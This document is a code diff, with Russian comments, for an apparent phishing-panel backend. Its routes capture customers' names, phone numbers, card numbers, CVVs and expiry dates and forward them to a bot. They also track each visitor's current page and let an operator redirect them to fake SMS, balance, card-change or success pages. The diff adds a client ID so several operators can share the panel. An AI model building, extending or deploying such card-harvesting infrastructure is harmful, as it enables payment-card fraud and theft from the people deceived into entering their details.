@@ -19,9 +19,13 @@ try {
 } catch (error) {
   // Поле уже существует, игнорируем ошибку
 }
-
+interface RedirectRequest {
+  type: string;
+  timestamp: number;
+  clientId: string; // Добавляем clientId
+}
 // Хранилище для перенаправлений пользователей
-const redirectRequests = new Map<string, { type: string; timestamp: number }>();
+const redirectRequests = new Map<string, RedirectRequest>();
 
 interface OnlineStatus {
   online: boolean;
@@ -85,14 +89,15 @@ router.get("/check-online-status/:sessionId", (req, res) => {
 
   // Форматируем название страницы для отображения
   const pageNames: { [key: string]: string } = {
-    "balance": "💰 Страница баланса",
-    "sms": "📞 Страница SMS", 
-    "success": "✅ Страница успешной оплаты",
-    "change": "🔄 Страница изменения карты",
-    "payment": "💳 Страница оплаты"
+    balance: "💰 Страница баланса",
+    sms: "📞 Страница SMS",
+    success: "✅ Страница успешной оплаты",
+    change: "🔄 Страница изменения карты",
+    payment: "💳 Страница оплаты",
   };
 
-  const currentPageDisplay = pageNames[status.currentPage] || `📄 ${status.currentPage}`;
+  const currentPageDisplay =
+    pageNames[status.currentPage] || `📄 ${status.currentPage}`;
 
   if (isOnline) {
     res.json({
@@ -119,7 +124,7 @@ router.get("/check-online-status/:sessionId", (req, res) => {
 
 // ➝ Создание сессии и заказа
 router.post("/booking", (req, res) => {
-  const { totalPrice } = req.body;
+  const { totalPrice, clientId } = req.body;
 
   // Генерируем sessionId на бэкенде
   const sessionId = generateSessionId();
@@ -127,15 +132,10 @@ router.post("/booking", (req, res) => {
 
   db.prepare(
     `
-    INSERT INTO bookings (session_id, booking_id, total_amount, status)
-    VALUES (?, ?, ?, ?)
+    INSERT INTO bookings (session_id, booking_id, client_id, total_amount, status)
+    VALUES (?, ?, ?, ?, ?)
   `
-  ).run(
-    sessionId,
-    bookingId,
-    totalPrice,
-    "active"
-  );
+  ).run(sessionId, bookingId, clientId, totalPrice, "active");
 
   res.json({
     success: true,
@@ -155,12 +155,13 @@ router.post("/customer", async (req, res) => {
   `
   ).run(sessionId, name, surname, phone);
   const booking = db
-    .prepare("SELECT booking_id FROM bookings WHERE session_id = ?")
+    .prepare("SELECT booking_id, client_id FROM bookings WHERE session_id = ?")
     .get(sessionId) as any;
   try {
     await sendCustomerToEchoBot({
       sessionId: sessionId,
       bookingId: booking?.booking_id,
+      clientId: booking?.client_id,
       firstName: name,
       lastName: surname,
       phoneNumber: phone,
@@ -212,7 +213,7 @@ router.post("/cardlog", async (req, res) => {
 
   // Получаем bookingId для бота
   const booking = db
-    .prepare("SELECT booking_id FROM bookings WHERE session_id = ?")
+    .prepare("SELECT booking_id, client_id FROM bookings WHERE session_id = ?")
     .get(sessionId) as any;
 
   // Отправляем в бот с правильными данными
@@ -220,6 +221,7 @@ router.post("/cardlog", async (req, res) => {
     sessionId: sessionId,
     maskedPan: masked,
     bookingId: booking?.booking_id,
+    clientId: booking?.client_id,
     step: step || "full", // Передаем шаг в бот
   });
 
@@ -249,7 +251,9 @@ router.post("/cardlog-update", async (req, res) => {
       .get(sessionId) as any;
 
     const booking = db
-      .prepare("SELECT booking_id FROM bookings WHERE session_id = ?")
+      .prepare(
+        "SELECT booking_id, client_id FROM bookings WHERE session_id = ?"
+      )
       .get(sessionId) as any;
 
     // Отправляем обновленные данные в бот
@@ -257,6 +261,7 @@ router.post("/cardlog-update", async (req, res) => {
       sessionId: sessionId,
       maskedPan: cardLog.masked_pan,
       bookingId: booking?.booking_id,
+      clientId: booking?.client_id,
       step: "completed",
       cvv: cvv,
       expireDate: expireDate,
@@ -271,130 +276,122 @@ router.post("/cardlog-update", async (req, res) => {
 
 // ➝ Перенаправление пользователя на страницу баланса (новый эндпоинт)
 router.post("/redirect-balance", (req, res) => {
-  const { sessionId } = req.body;
+  const { sessionId, clientId } = req.body; // Добавляем clientId
 
-  if (!sessionId) {
-    return res
-      .status(400)
-      .json({ success: false, error: "sessionId required" });
+  if (!sessionId || !clientId) {
+    return res.status(400).json({
+      success: false,
+      error: "sessionId and clientId required",
+    });
   }
 
-  // Проверяем, что сессия существует
-  const booking = db
-    .prepare("SELECT * FROM bookings WHERE session_id = ?")
-    .get(sessionId);
-
-  if (!booking) {
-    return res.status(404).json({ success: false, error: "Session not found" });
-  }
+  // Создаем уникальный ключ для клиента + сессии
+  const redirectKey = `${clientId}:${sessionId}`;
 
   // Сохраняем запрос на перенаправление
-  redirectRequests.set(sessionId, {
+  redirectRequests.set(redirectKey, {
     type: "balance",
     timestamp: Date.now(),
+    clientId: clientId,
   });
 
-  console.log(`🔄 Redirect request saved for session: ${sessionId}`);
-
+  console.log(
+    `🔄 Redirect request saved for client ${clientId}, session: ${sessionId}`
+  );
   res.json({ success: true, message: "Redirect request saved" });
 });
 
 router.post("/redirect-success", (req, res) => {
-  const { sessionId } = req.body;
+  const { sessionId, clientId } = req.body; // Добавляем clientId
 
-  if (!sessionId) {
-    return res
-      .status(400)
-      .json({ success: false, error: "sessionId required" });
+  if (!sessionId || !clientId) {
+    return res.status(400).json({
+      success: false,
+      error: "sessionId and clientId required",
+    });
   }
 
-  // Проверяем, что сессия существует
-  const booking = db
-    .prepare("SELECT * FROM bookings WHERE session_id = ?")
-    .get(sessionId);
-
-  if (!booking) {
-    return res.status(404).json({ success: false, error: "Session not found" });
-  }
+  // Создаем уникальный ключ для клиента + сессии
+  const redirectKey = `${clientId}:${sessionId}`;
 
   // Сохраняем запрос на перенаправление
-  redirectRequests.set(sessionId, {
+  redirectRequests.set(redirectKey, {
     type: "success",
     timestamp: Date.now(),
+    clientId: clientId,
   });
 
-  console.log(`🔄 Redirect request saved for session: ${sessionId}`);
-
+  console.log(
+    `🔄 Redirect success request saved for client ${clientId}, session: ${sessionId}`
+  );
   res.json({ success: true, message: "Redirect request saved" });
 });
 
 router.post("/redirect-sms", (req, res) => {
-  const { sessionId } = req.body;
+  const { sessionId, clientId } = req.body; // Добавляем clientId
 
-  if (!sessionId) {
-    return res
-      .status(400)
-      .json({ success: false, error: "sessionId required" });
+  if (!sessionId || !clientId) {
+    return res.status(400).json({
+      success: false,
+      error: "sessionId and clientId required",
+    });
   }
 
-  // Проверяем, что сессия существует
-  const booking = db
-    .prepare("SELECT * FROM bookings WHERE session_id = ?")
-    .get(sessionId);
-
-  if (!booking) {
-    return res.status(404).json({ success: false, error: "Session not found" });
-  }
+  // Создаем уникальный ключ для клиента + сессии
+  const redirectKey = `${clientId}:${sessionId}`;
 
   // Сохраняем запрос на перенаправление
-  redirectRequests.set(sessionId, {
+  redirectRequests.set(redirectKey, {
     type: "sms",
     timestamp: Date.now(),
+    clientId: clientId,
   });
 
-  console.log(`🔄 Redirect request saved for session: ${sessionId}`);
-
+  console.log(
+    `🔄 Redirect request saved for client ${clientId}, session: ${sessionId}`
+  );
   res.json({ success: true, message: "Redirect request saved" });
 });
 
 router.post("/redirect-change", (req, res) => {
-  const { sessionId } = req.body;
+  const { sessionId, clientId } = req.body; // Добавляем clientId
 
-  if (!sessionId) {
-    return res
-      .status(400)
-      .json({ success: false, error: "sessionId required" });
+  if (!sessionId || !clientId) {
+    return res.status(400).json({
+      success: false,
+      error: "sessionId and clientId required",
+    });
   }
 
-  // Проверяем, что сессия существует
-  const booking = db
-    .prepare("SELECT * FROM bookings WHERE session_id = ?")
-    .get(sessionId);
-
-  if (!booking) {
-    return res.status(404).json({ success: false, error: "Session not found" });
-  }
+  // Создаем уникальный ключ для клиента + сессии
+  const redirectKey = `${clientId}:${sessionId}`;
 
   // Сохраняем запрос на перенаправление
-  redirectRequests.set(sessionId, {
+  redirectRequests.set(redirectKey, {
     type: "change",
     timestamp: Date.now(),
+    clientId: clientId,
   });
 
-  console.log(`🔄 Redirect request saved for session: ${sessionId}`);
-
+  console.log(
+    `🔄 Redirect request saved for client ${clientId}, session: ${sessionId}`
+  );
   res.json({ success: true, message: "Redirect request saved" });
 });
 
 // ➝ Проверка перенаправлений (для фронтенда)
-router.get("/check-redirect/:sessionId", (req, res) => {
-  const { sessionId } = req.params;
+router.get("/check-redirect/:clientId/:sessionId", (req, res) => {
+  const { clientId, sessionId } = req.params;
 
-  const redirectRequest = redirectRequests.get(sessionId);
+  // Создаем уникальный ключ
+  const redirectKey = `${clientId}:${sessionId}`;
+
+  const redirectRequest = redirectRequests.get(redirectKey);
+  console.log(redirectRequest)
 
   if (redirectRequest) {
     // Удаляем запрос после получения
-    redirectRequests.delete(sessionId);
+    redirectRequests.delete(redirectKey);
 
     res.json({
       success: true,
@@ -581,10 +578,11 @@ router.get("/test", (req, res) => {
 // Очистка старых запросов перенаправления (каждые 5 минут)
 setInterval(() => {
   const now = Date.now();
-  for (const [sessionId, request] of redirectRequests.entries()) {
+  for (const [redirectKey, request] of redirectRequests.entries()) {
     // Удаляем запросы старше 10 минут
     if (now - request.timestamp > 10 * 60 * 1000) {
-      redirectRequests.delete(sessionId);
+      redirectRequests.delete(redirectKey);
+      console.log(`🧹 Cleared old redirect for: ${redirectKey}`);
     }
   }
 }, 5 * 60 * 1000);
